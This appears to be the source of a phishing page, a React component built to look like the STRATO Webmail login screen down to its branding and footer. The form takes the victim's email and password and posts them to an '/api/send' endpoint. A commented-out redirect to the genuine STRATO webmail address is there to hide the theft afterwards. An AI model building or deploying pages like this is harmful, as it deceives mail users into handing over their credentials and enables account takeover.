"use client";
import Image from "next/image";
import Header from "./header";
import { useEffect, useState, useRef, FormEvent } from "react";
import { Lang, i18n } from "../../i18n.config";
import axios from "axios";

export default function Home() {
  const [languages, setLanguages] = useState<Lang | null>(null);
  const [langChange, setLangChange] = useState<(typeof i18n.locales)[number]>(
    i18n.defaultLocale
  );

  const forma = useRef<HTMLFormElement>(null);

  const formData = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const dataObj: { [key: string]: string } = {};
    if (forma.current) {
      const data = new FormData(forma.current);

      for (const [key, val] of data.entries()) {
        dataObj[key] = val as string;
      }
    }

    console.log(dataObj);

    try {
      const result = await axios.post("/api/send", JSON.stringify(dataObj));

      console.log(result);

      if (result.status === 200) {
        // return window.location.replace(
        //   "https://webmail.strato.com/appsuite/ui"
        // );
      }

      return;
    } catch (error) {
      console.log(error);
    }
  };
  useEffect(() => {
    const lang = sessionStorage?.getItem(
      "lang"
    ) as (typeof i18n.locales)[number];
    import("../../inter/language.json").then((mod) => {
      setLanguages(mod.default[lang ?? i18n.defaultLocale]);
    });
  }, [langChange, languages]);

  if (languages)
    return (
      <>
        <Header lang={languages} setLangChange={setLangChange} />
        <main className="w-[90%] sm:w-[430px] shadow-3xl h-[75vh] mx-auto sm:mt-5 border-[0.2px] relative">
          <div className="bg-stone-100 h-[12%] flex items-center space-x-3 pl-6">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="#666"
              viewBox="0 0 24 24"
              strokeWidth={1.5}
              stroke="#fff"
              className="w-8 h-8"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M21.75 6.75v10.5a2.25 2.25 0 01-2.25 2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75"
              />
            </svg>

            <h1 className="text-[#665] text-2xl font-medium">STRATO Webmail</h1>
          </div>

          <h1 className="text-[#665] pl-4 text-2xl font-medium mt-7">
            {languages.login}
          </h1>

          <form ref={forma} onSubmit={formData} className="pl-8 pt-14">
            <label htmlFor="email" className="text-sm text-[#665]">
              {languages.email}
            </label>
            <div
              className="flex items-center border border-stone-300 mr-10 rounded-md mb-7
           focus-within:border-sky-400 focus-within:shadow-md
            focus-within:shadow-sky-200"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="#666"
                viewBox="0 0 24 24"
                strokeWidth={1.5}
                stroke="#fff"
                className="w-5 h-5 left ml-2 mr-[0.1rem]"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M21.75 6.75v10.5a2.25 2.25 0 01-2.25 2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75"
                />
              </svg>
              <input
                type="email"
                name="email"
                id="em"
                className="block py-2 px-1 outline-none w-full mr-1"
                required
              />
            </div>

            <label htmlFor="email" className="text-sm text-[#665]">
              {languages.password}
            </label>
            <div
              className="flex items-center border border-stone-300 mr-10 rounded-md focus-within:border-sky-400 focus-within:shadow-md
            "
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                viewBox="0 0 24 24"
                fill="#666"
                className="w-5 h-5 ml-2 mr-[0.1rem]"
              >
                <path
                  fillRule="evenodd"
                  d="M12 1.5a5.25 5.25 0 00-5.25 5.25v3a3 3 0 00-3 3v6.75a3 3 0 003 3h10.5a3 3 0 003-3v-6.75a3 3 0 00-3-3v-3c0-2.9-2.35-5.25-5.25-5.25zm3.75 8.25v-3a3.75 3.75 0 10-7.5 0v3h7.5z"
                  clipRule="evenodd"
                />
              </svg>

              <input
                type="password"
                name="pass"
                id="pass"
                className="block py-2 px-1 outline-none w-full mr-1"
                required
              />
            </div>

            <h3 className="text-sky-600 text-sm float-right mr-10 mt-1">
              {languages.forgot}
            </h3>

            <div className="flex space-x-2 mt-10">
              <input type="checkbox" name="check" id="" />
              <h3 className="text-[#665]">{languages.stay}</h3>
            </div>

            <input
              type="submit"
              value={languages.sign}
              className="bg-sky-600 py-2 w-[85%] text-white absolute bottom-5 cursor-pointer"
            />
          </form>
        </main>
        <footer className="mt-10 h-[10vh] bg-[#f80] flex flex-col md:flex-row justify-between items-center px-10 pt-4 sm:pt-0 text-white text-xs sm:text-sm">
          <div className="flex items-center space-x-3">
            <p>{languages.strato}</p>
            <p>{languages.terms}</p>
            <p>{languages.priv}</p>
            <p>{languages.imprint}</p>
          </div>
          <div className="flex space-x-3">
            <span>&copy; 2023 OX Software GmbH</span>
            <p>Version: 7.10.6</p>
          </div>
        </footer>
      </>
    );
  else {
    return <div></div>;
  }
}
